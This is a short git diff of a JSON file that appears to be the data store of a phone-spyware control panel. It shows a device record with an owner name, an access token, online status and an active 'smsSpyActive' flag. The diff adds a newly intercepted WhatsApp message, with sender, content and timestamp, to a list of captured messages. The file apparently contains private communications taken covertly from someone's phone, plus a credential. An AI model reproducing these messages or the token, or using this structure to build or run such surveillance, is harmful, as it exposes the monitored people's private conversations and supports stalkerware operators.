@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775227633998,
+    "lastSeen": 1775227643148,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -7703,6 +7703,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "capel: Joni besar wd",
+        "content": "kaya mame",
+        "time": "03/04 21:47",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775227643334
+      },
       {
         "appName": "WhatsApp",
         "sender": "Joni besar wd",
